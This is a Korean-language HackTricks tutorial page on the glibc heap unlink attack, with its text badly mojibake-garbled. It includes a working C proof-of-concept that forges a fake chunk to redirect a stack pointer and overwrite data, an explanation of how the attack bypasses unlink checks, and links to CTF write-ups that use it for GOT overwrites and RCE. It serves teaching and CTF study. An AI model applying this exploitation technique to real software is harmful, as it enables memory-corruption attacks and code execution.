# Unlink Attack

{% hint style="success" %}
AWS ν•΄ν‚Ή ν•™μµ λ° μ‹¤μµ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ν•΄ν‚Ή ν•™μµ λ° μ‹¤μµ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks μ§€μ›</summary>

* [**κµ¬λ… μ”κΈμ **](https://github.com/sponsors/carlospolop)λ¥Ό ν™•μΈν•μ„Έμ”!
* π’¬ [**λ””μ¤μ½”λ“ κ·Έλ£Ή**](https://discord.gg/hRep4RUj7f) λλ” [**ν…”λ κ·Έλ¨ κ·Έλ£Ή**](https://t.me/peass)μ— **μ°Έμ—¬**ν•κ±°λ‚ **νΈμ„ν„°** π¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**λ¥Ό ν”λ΅μ°**ν•μ„Έμ”.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) λ° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) κΉƒν—™ λ ν¬μ§€ν† λ¦¬μ— PRμ„ μ μ¶ν•μ—¬ ν•΄ν‚Ή νΈλ¦­μ„ κ³µμ ν•μ„Έμ”.

</details>
{% endhint %}

## κΈ°λ³Έ μ •λ³΄

μ΄ κ³µκ²©μ΄ λ°κ²¬λμ—μ„ λ• λ€λ¶€λ¶„ WWW (Write What Where)λ¥Ό ν—μ©ν–μ§€λ§, μΌλ¶€ **κ²€μ‚¬κ°€ μ¶”κ°€**λμ–΄ κ³µκ²©μ μƒ λ²„μ „μ΄ λ” ν¥λ―Έλ΅­κ³  λ” λ³µμ΅ν•λ©° **μ“Έλ¨μ—†λ”** κ²ƒμΌλ΅ λ§λ“¤μ–΄μ΅μµλ‹λ‹¤.

### μ½”λ“ μμ‹:

<details>

<summary>μ½”λ“</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* κ³µκ²©μ€ tcachesκ°€ μ‚¬μ©λ  κ²½μ° μ‘λ™ν•μ§€ μ•μµλ‹λ‹¤ (2.26 μ΄ν›„)

### λ©ν‘

μ΄ κ³µκ²©μ€ **λ©μ–΄λ¦¬λ¥Ό κ°€λ¦¬ν‚¤λ” ν¬μΈν„°λ¥Ό μμ‹ μ 3 μ£Όμ† μ•μΌλ΅ λ³€κ²½**ν•λ” κ²ƒμ„ κ°€λ¥ν•κ² ν•©λ‹λ‹¤. μ΄ μƒλ΅μ΄ μ„μΉ(ν¬μΈν„°κ°€ μ„μΉν–λ μ£Όλ³€)μ— ν¥λ―Έλ΅μ΄ λ‚΄μ©μ΄ μμΌλ©΄, λ‹¤λ¥Έ μ μ–΄ κ°€λ¥ν• ν• λ‹Ή/μ¤νƒ λ“±μ΄ μμ„ μ μμ–΄ λ” ν° ν”Όν•΄λ¥Ό μΌμΌν‚¬ μ μμµλ‹λ‹¤.

* λ§μ•½ μ΄ ν¬μΈν„°κ°€ μ¤νƒμ— μ„μΉν–λ‹¤λ©΄, μ΄μ  3 μ£Όμ† μ•μ„ κ°€λ¦¬ν‚¤κ³  μκΈ° λ•λ¬Έμ— μ‚¬μ©μκ°€ μ΄λ¥Ό μ½κ³  μμ •ν•  μ μμΌλ―€λ΅, μ¤νƒμ—μ„ λ―Όκ°ν• μ •λ³΄λ¥Ό μ μ¶ν•κ±°λ‚ μ‹¬μ§€μ–΄ canaryλ¥Ό κ±΄λ“λ¦¬μ§€ μ•κ³  λ°ν™ μ£Όμ†λ¥Ό μμ •ν•  μ μμ„ κ²ƒμ…λ‹λ‹¤.
* CTF μμ‹μ—μ„, μ΄ ν¬μΈν„°λ” λ‹¤λ¥Έ ν• λ‹Ήμ— λ€ν• ν¬μΈν„° λ°°μ—΄μ— μ„μΉν•΄ μμΌλ―€λ΅, 3 μ£Όμ† μ•μ„ κ°€λ¦¬ν‚¤λ„λ΅ λ§λ“¤μ–΄ λ‹¤λ¥Έ ν¬μΈν„°λ“¤μ΄ λ‹¤λ¥Έ μ£Όμ†λ¥Ό κ°€λ¦¬ν‚¤λ„λ΅ ν•  μ μμµλ‹λ‹¤.\
μ‚¬μ©μκ°€ λ‹¤λ¥Έ ν• λ‹Ήλ„ μ½κ³  μ“Έ μ μκΈ° λ•λ¬Έμ— μ •λ³΄λ¥Ό μ μ¶ν•κ±°λ‚ μ„μμ μ„μΉ(μ: GOT)μ— μƒ μ£Όμ†λ¥Ό λ®μ–΄μ“Έ μ μμµλ‹λ‹¤.

### μ”κµ¬ μ‚¬ν•­

* λ©”λ¨λ¦¬(μ: μ¤νƒ)μ—μ„ μΌλ¶€ μ μ–΄λ¥Ό μ–»μ–΄ μΌλ¶€ μ†μ„±μ— κ°’μ„ μ κ³µν•μ—¬ λ©μ–΄λ¦¬λ¥Ό λ‡ κ° λ§λ“­λ‹λ‹¤.
* κ°€μ§ λ©μ–΄λ¦¬μ ν¬μΈν„°λ¥Ό μ„¤μ •ν•κΈ° μ„ν•΄ μ¤νƒ μ μ¶μ΄ ν•„μ”ν•©λ‹λ‹¤.

### κ³µκ²©

* λ‘ κ°μ λ©μ–΄λ¦¬κ°€ μμµλ‹λ‹¤ (chunk1 λ° chunk2)
* κ³µκ²©μλ” chunk1μ λ‚΄μ©κ³Ό chunk2μ ν—¤λ”λ¥Ό μ μ–΄ν•©λ‹λ‹¤.
* chunk1μ—μ„ κ³µκ²©μλ” κ°€μ§ λ©μ–΄λ¦¬μ κµ¬μ΅°λ¥Ό λ§λ“­λ‹λ‹¤:
* λ³΄νΈ κΈ°λ¥μ„ μ°νν•κΈ° μ„ν•΄ `size` ν•„λ“κ°€ μ¬λ°”λ¥Έμ§€ ν™•μΈν•μ—¬ `corrupted size vs. prev_size while consolidating` μ¤λ¥λ¥Ό ν”Όν•©λ‹λ‹¤.
* κ·Έλ¦¬κ³  κ°€μ§ λ©μ–΄λ¦¬μ `fd` λ° `bk` ν•„λ“κ°€ chunk1 ν¬μΈν„°κ°€ μ €μ¥λ μ„μΉλ¥Ό κ°€λ¦¬ν‚¤λ„λ΅ λ§λ“¤μ–΄μ¤λ‹λ‹¤. κ°κ° -3 λ° -2μ μ¤ν”„μ…‹μ„ μ‚¬μ©ν•μ—¬ `fake_chunk->fd->bk` λ° `fake_chunk->bk->fd`κ°€ μ‹¤μ  chunk1 μ£Όμ†κ°€ μλ” λ©”λ¨λ¦¬(μ¤νƒ) μ„μΉλ¥Ό κ°€λ¦¬ν‚¤λ„λ΅ ν•©λ‹λ‹¤:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* chunk2μ ν—¤λ”λ” μ΄μ „ λ©μ–΄λ¦¬κ°€ μ‚¬μ©λμ§€ μ•μ•μμ„ λ‚νƒ€λ‚΄κ³ , κ°€μ§ λ©μ–΄λ¦¬κ°€ ν¬ν•¨λ ν¬κΈ°κ°€ ν¬κΈ°μ„μ„ λ‚νƒ€λ‚΄λ„λ΅ μμ •λ©λ‹λ‹¤.
* λ‘ λ²μ§Έ λ©μ–΄λ¦¬κ°€ ν•΄μ λλ©΄ μ΄ κ°€μ§ λ©μ–΄λ¦¬κ°€ μ—°κ²° ν•΄μ λ©λ‹λ‹¤:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* μ΄μ „μ— `fake_chunk->fd->bk` λ° `fake_chunk->bk->fd`κ°€ λ™μΌν• μ„μΉ(μ¤νƒμ— chunk1μ΄ μ €μ¥λ μ„μΉ)λ¥Ό κ°€λ¦¬ν‚¤λ„λ΅ λ§λ“¤μ–΄μ΅μΌλ―€λ΅ μ ν¨ν• μ—°κ²°λ λ©λ΅μ΄μ—μµλ‹λ‹¤. **λ‘ μ„μΉκ°€ λ™μΌν• μ„μΉλ¥Ό κ°€λ¦¬ν‚¤κ³  μκΈ° λ•λ¬Έμ—** λ§μ§€λ§‰ κ²ƒλ§(`fake_chunk->bk->fd = fake_chunk->fd`) **μ μ©**λ©λ‹λ‹¤.
* μ΄λ΅ μΈν•΄ μ¤νƒμ— μλ” chunk1μ ν¬μΈν„°κ°€ μ¤νƒμ—μ„ 3 μ£Όμ† μ•μ— μ €μ¥λ μ£Όμ†(λλ” λ°”μ΄νΈ)λ΅ λ®μ–΄μ”μ›μ§‘λ‹λ‹¤.
* λ”°λΌμ„, κ³µκ²©μκ°€ λ‹¤μ‹ chunk1μ λ‚΄μ©μ„ μ μ–΄ν•  μ μλ‹¤λ©΄, **μ¤νƒ λ‚΄λ¶€μ— μ“Έ μ μκ² λμ–΄ canaryλ¥Ό κ±΄λ“λ¦¬μ§€ μ•κ³  λ°ν™ μ£Όμ†λ¥Ό λ®μ–΄μ“°κ³  λ΅μ»¬ λ³€μμ κ°’μ„ λ° ν¬μΈνΈλ¥Ό μμ •ν•  μ μμ„ κ²ƒ**μ…λ‹λ‹¤. λν• λ‹¤μ‹ chunk1μ΄ μ¤νƒμ— μ €μ¥λ μ£Όμ†λ¥Ό λ‹¤λ¥Έ μ„μΉλ΅ μμ •ν•  μ μκ² λλ©΄, κ³µκ²©μκ°€ λ‹¤μ‹ chunk1μ λ‚΄μ©μ„ μ μ–΄ν•  μ μλ‹¤λ©΄ μ–΄λ””λ“  μ“Έ μ μμ„ κ²ƒμ…λ‹λ‹¤.
* μ΄κ²ƒμ΄ κ°€λ¥ν–λ μ΄μ λ” **μ£Όμ†κ°€ μ¤νƒμ— μ €μ¥**λμ–΄ μμ—κΈ° λ•λ¬Έμ…λ‹λ‹¤. μ„ν— λ° μ•…μ©μ€ **κ°€μ§ λ©μ–΄λ¦¬μ μ£Όμ†κ°€ μ–΄λ””μ— μ €μ¥λμ–΄ μλ”μ§€**μ— λ”°λΌ λ‹¬λΌμ§ μ μμµλ‹λ‹¤.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## μ°Έκ³  μλ£

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* CTFμ—μ„ μ‹¬μ§€μ–΄ unlink κ³µκ²©μ„ μ°Ύλ” κ²ƒμ΄ μ΄μƒν•  μ μμ§€λ§, μ΄ κ³µκ²©μ΄ μ‚¬μ©λ writeupμ„ ν™•μΈν•  μ μλ” λ‡ κ°€μ§€ μμ‹κ°€ μμµλ‹λ‹¤:
* CTF μμ‹: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* μ΄ μμ‹μ—μ„λ” μ¤νƒ λ€μ‹  mallocλ μ£Όμ†μ λ°°μ—΄μ΄ μμµλ‹λ‹¤. unlink κ³µκ²©μ€ μ—¬κΈ°μ— λ©μ–΄λ¦¬λ¥Ό ν• λ‹Ήν•  μ μλ„λ΅ μν–‰λμ–΄ mallocλ μ£Όμ†μ λ°°μ—΄μ ν¬μΈν„°λ¥Ό μ μ–΄ν•  μ μκ² ν•©λ‹λ‹¤. κ·Έλ° λ‹¤μ, μ΄λ¬ν• μ£Όμ†μ λ©μ–΄λ¦¬ λ‚΄μ©μ„ μμ •ν•  μ μλ” λ‹¤λ¥Έ κΈ°λ¥μ΄ μμ–΄ GOTλ¥Ό κ°€λ¦¬ν‚¤λ” μ£Όμ†λ¥Ό μμ •ν•μ—¬ leaks λ° RCEλ¥Ό μ–»μ„ μ μμµλ‹λ‹¤.
* λ‹¤λ¥Έ CTF μμ‹: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
* μ΄μ „ μμ‹μ™€ λ§μ°¬κ°€μ§€λ΅ ν• λ‹Ή μ£Όμ†μ λ°°μ—΄μ΄ μμµλ‹λ‹¤. unlink κ³µκ²©μ„ μν–‰ν•μ—¬ μ²« λ²μ§Έ ν• λ‹Ή μ£Όμ†κ°€ λ°°μ—΄ μ‹μ‘ λ¶€λ¶„λ³΄λ‹¤ μ•μ— μλ” λ‡ κ°€μ§€ μ„μΉλ¥Ό κ°€λ¦¬ν‚¤λ„λ΅ λ§λ“¤κ³ , κ·Έλ° λ‹¤μ μ΄ μƒ μ„μΉμ— ν• λ‹Ήμ„ λ®μ–΄μ”λ‹λ‹¤. λ”°λΌμ„, λ‹¤λ¥Έ ν• λ‹Ήμ ν¬μΈν„°λ¥Ό GOTμ atoiλ¥Ό κ°€λ¦¬ν‚¤λ„λ΅ λ®μ–΄μ“Έ μ μμΌλ©°, libc leakμ„ μ–»κΈ° μ„ν•΄ μ΄λ¥Ό μ¶λ ¥ν•κ³ , κ·Έλ° λ‹¤μ atoi GOTλ¥Ό one gadget μ£Όμ†λ΅ λ®μ–΄μ“Έ μ μμµλ‹λ‹¤.
* unlink κ³µκ²©κ³Ό λ§¤μ° μ μ‚¬ν• μ·¨μ•½μ μ„ μ•…μ©ν•λ” μ‚¬μ©μ μ •μ malloc λ° free ν•¨μκ°€ μλ” CTF μμ‹: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* μ‚¬μ©μ μ •μ mallocμ FD λ° BK ν¬μΈν„°λ¥Ό μ μ–΄ν•  μ μλ” μ¤λ²„ν”λ΅μ°κ°€ μμµλ‹λ‹¤. λν• ν™μ— exec λΉ„νΈκ°€ μμ–΄ ν™ μ£Όμ†λ¥Ό μ μ¶ν•κ³  GOTμ ν•¨μλ¥Ό ν™ λ©μ–΄λ¦¬μ— μ‰μ½”λ“λ΅ μ‹¤ν–‰ν•  μ μμµλ‹λ‹¤.
